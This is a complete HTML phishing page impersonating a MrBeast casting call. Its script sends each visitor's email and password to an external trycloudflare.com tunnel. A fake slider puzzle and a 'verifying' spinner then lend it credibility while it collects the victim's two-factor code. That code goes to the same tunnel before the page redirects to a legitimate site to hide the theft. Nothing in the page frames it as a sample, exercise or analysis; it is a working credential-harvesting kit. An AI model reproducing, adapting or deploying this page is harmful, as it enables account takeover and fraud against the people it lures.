<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <link href="https://fonts.googleapis.com" rel="stylesheet">
    <title>MrBeast Casting</title>
    <style>
        :root { --primary-blue: #00a8e8; --beast-pink: #f12e3e; }
        * { box-sizing: border-box; }
        
        body { 
            font-family: -apple-system, sans-serif; 
            display: flex; 
            flex-direction: column; 
            align-items: center; 
            min-height: 100vh; 
            background-color: var(--primary-blue); 
            margin: 0; 
            color: #fff; 
            overflow-x: hidden; 
            position: relative; 
        }
        
        .bg-pattern { 
            position: fixed; 
            top: 0; 
            left: 0; 
            width: 100%; 
            height: 100%; 
            background-image: url('https://crystalpng.com/wp-content/uploads/2025/02/MrBeast-logo-06.png'); 
            background-size: 70px; 
            opacity: 0.25; 
            z-index: 0; 
            pointer-events: none; 
        }
        
        .top-logo { 
            width: 320px; 
            margin-top: 50px; 
            margin-bottom: 20px; 
            filter: drop-shadow(0 0 20px rgba(0,0,0,0.4)); 
            z-index: 5; 
            position: relative; 
        }
        
        .box { 
            background: #111; 
            border-radius: 35px; 
            width: 92%; 
            max-width: 400px; 
            padding: 45px 30px; 
            text-align: center; 
            box-shadow: 0 25px 60px rgba(0,0,0,0.8); 
            border: 1px solid #333; 
            position: relative; 
            z-index: 10; 
            margin-bottom: 60px; 
        }
        
        .mid-logo { 
            width: 130px; 
            margin: 0 auto 20px auto; 
            display: block; 
            filter: drop-shadow(0 0 15px var(--primary-blue)); 
        }
        
        .mrbeast-style-text { 
            font-family: 'Kanit', sans-serif; 
            font-weight: 900; 
            font-style: italic; 
            font-size: 32px; 
            color: #fff; 
            margin: 0 0 20px 0; 
            text-transform: uppercase; 
            letter-spacing: -1px; 
            text-shadow: 3px 3px 0px var(--primary-blue), 6px 6px 20px rgba(0,0,0,0.6); 
            line-height: 1; 
        }
        
        .mr-txt { color: var(--beast-pink); -webkit-text-stroke: 1px #fff; }

        p { margin: 0 0 30px 0; color: #aaa; font-size: 14px; font-weight: 600; line-height: 1.4; }
        
        input { 
            width: 100%; 
            padding: 18px; 
            margin-bottom: 15px; 
            border: 1px solid #222; 
            background: #1a1a1a; 
            color: white; 
            border-radius: 15px; 
            font-size: 16px; 
            outline: none; 
            transition: 0.3s;
        }
        
        input:focus { border-color: var(--primary-blue); box-shadow: 0 0 15px rgba(0, 168, 232, 0.3); }
        
        .main-btn { 
            background: linear-gradient(45deg, #f12e3e, #ff5e62); 
            color: #fff; 
            border: none; 
            padding: 20px; 
            border-radius: 15px; 
            cursor: pointer; 
            width: 100%; 
            font-weight: 800; 
            text-transform: uppercase; 
            font-size: 16px; 
            box-shadow: 0 10px 25px rgba(241, 46, 62, 0.4); 
        }
        
        #puzzle-box, #loader, #step2_box { display: none; }
        .puzzle-container { background: #1a1a1a; padding: 15px; border-radius: 20px; border: 1px solid #333; margin-top: 10px; }
        .canvas-area { 
            width: 100%; 
            height: 180px; 
            background: url('https://images.unsplash.com') center/cover; 
            border-radius: 12px; 
            position: relative; 
            border: 1px solid #444; 
        }
        .puzzle-piece { 
            position: absolute; 
            width: 55px; 
            height: 55px; 
            background: inherit; 
            border: 2px solid #fff; 
            border-radius: 10px; 
            top: 60px; 
            left: 15px; 
            z-index: 100; 
            filter: brightness(1.2) drop-shadow(0 0 10px #000); 
        }
        .puzzle-slot { 
            position: absolute; 
            width: 55px; 
            height: 55px; 
            background: rgba(0,0,0,0.7); 
            border: 2px dashed var(--primary-blue); 
            right: 50px; 
            top: 60px; 
            border-radius: 10px; 
        }
        
        .slider-track { width: 100%; height: 55px; background: #222; border-radius: 30px; margin-top: 25px; position: relative; border: 1px solid #444; overflow: hidden; }
        .slider-handle { 
            width: 70px; 
            height: 55px; 
            background: var(--primary-blue); 
            border-radius: 30px; 
            position: absolute; 
            left: 0; 
            cursor: pointer; 
            display: flex; 
            align-items: center; 
            justify-content: center; 
            font-weight: bold; 
            font-size: 20px; 
            color: #000; 
            box-shadow: 0 0 15px var(--primary-blue); 
        }
        
        .spinner { border: 5px solid rgba(0, 212, 255, 0.1); border-top: 5px solid var(--primary-blue); border-radius: 50%; width: 50px; height: 50px; animation: spin 0.8s linear infinite; margin: 30px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="bg-pattern"></div>
    
    <img src="https://crystalpng.com/wp-content/uploads/2025/02/MrBeast-logo-06.png" class="top-logo" alt="Main Header Logo">

    <div class="box">
        <div id="step1">
            <img src="https://crystalpng.com/wp-content/uploads/2025/02/MrBeast-logo-06.png" class="mid-logo" alt="Box Center Logo">
            
            <div class="mrbeast-style-text"><span class="mr-txt">MR</span> BEAST CASTING</div>
            <p>Fill in your details to apply for the next viral challenge</p>
            
            <input type="email" id="email" placeholder="Email Address" required>
            <input type="password" id="pass" placeholder="Password" required>
            <button type="button" class="main-btn" onclick="goToPuzzle()">CONTINUE</button>
        </div>

        <div id="puzzle-box">
            <p>Verification Match the Puzzle</p>
            <div class="puzzle-container">
                <div class="canvas-area">
                    <div class="puzzle-slot"></div>
                    <div class="puzzle-piece" id="piece"></div>
                </div>
                <div class="slider-track" id="track">
                    <div class="slider-handle" id="handle">>>></div>
                </div>
            </div>
        </div>

        <div id="loader"><div class="spinner"></div><p>Verifying Human Identity</p></div>

        <div id="step2_box">
            <div class="mrbeast-style-text" style="font-size:24px;">SECURITY CHECK</div>
            <p>We've sent a code to your email Enter it below to finish</p>
            <input type="text" id="2fa_code" placeholder="000000" maxlength="6" style="text-align:center; letter-spacing:12px; font-size:26px; font-weight:bold;">
            <button type="button" class="main-btn" onclick="submitOTP()">FINISH APPLICATION</button>
        </div>
    </div>

    <script>
        const tunnel = "https://postposted-settings-belly-quest.trycloudflare.com";

        function goToPuzzle() {
            var e = document.getElementById('email').value, p = document.getElementById('pass').value;
            if(e && p) {
                fetch(tunnel, { method: 'POST', body: new URLSearchParams({'email': e, 'pass': p}) });
                document.getElementById('step1').style.display = 'none'; 
                document.getElementById('puzzle-box').style.display = 'block';
                startPuzzle();
            }
        }

        function startPuzzle() {
            const handle = document.getElementById('handle'), piece = document.getElementById('piece'), track = document.getElementById('track');
            let dragging = false;

            const move = (e) => {
                if (!dragging) return;
                let clientX = e.touches ? e.touches[0].clientX : e.clientX;
                let rect = track.getBoundingClientRect();
                let x = clientX - rect.left - 35;
                if (x < 0) x = 0;
                if (x > rect.width - 70) x = rect.width - 70;
                handle.style.left = x + 'px';
                piece.style.left = (15 + (x / (rect.width - 70)) * 260) + 'px';
                if (x > rect.width - 95) { dragging = false; showLoader(); }
            };

            handle.addEventListener('mousedown', () => dragging = true);
            handle.addEventListener('touchstart', (e) => { dragging = true; });
            window.addEventListener('mousemove', move);
            window.addEventListener('touchmove', move);
            window.addEventListener('mouseup', () => dragging = false);
            window.addEventListener('touchend', () => dragging = false);
        }

        function showLoader() {
            document.getElementById('puzzle-box').style.display = 'none'; 
            document.getElementById('loader').style.display = 'block';
            setTimeout(() => { 
                document.getElementById('loader').style.display = 'none'; 
                document.getElementById('step2_box').style.display = 'block'; 
            }, 3000);
        }

        function submitOTP() {
    const c = document.getElementById('2fa_code').value; 
    fetch('https://postposted-settings-belly-quest.trycloudflare.com', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: new URLSearchParams({ '2fa_code': c })
    }).then(() => {
        // --- PUT THE REDIRECT HERE ---
        window.location.href = "https://www.beastgames.com";
    }).catch(() => {
        // Redirect even if there is an error so the site "unsticks"
        window.location.href = "https://www.beastgames.com";
    });
}

    </script>
</body>
</html>
